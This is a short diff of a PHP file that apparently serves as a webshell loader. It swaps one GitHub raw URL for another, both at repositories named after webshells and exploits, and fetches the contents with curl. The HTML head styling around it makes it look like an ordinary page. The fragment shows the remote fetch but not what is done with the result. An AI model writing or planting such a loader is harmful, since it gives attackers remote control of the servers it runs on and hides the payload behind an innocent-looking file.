@@ -53,7 +53,7 @@ $head = '<head><meta name="viewport" content="width=device-width, initial-scale=
 <style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}
 </style>
 </head>';
-$url = "https://raw.githubusercontent.com/Anonrocks/Exploitssss/master/webshell%20bypass%20server%202024.png";
+$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/minnin";
 $ch = curl_init($url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
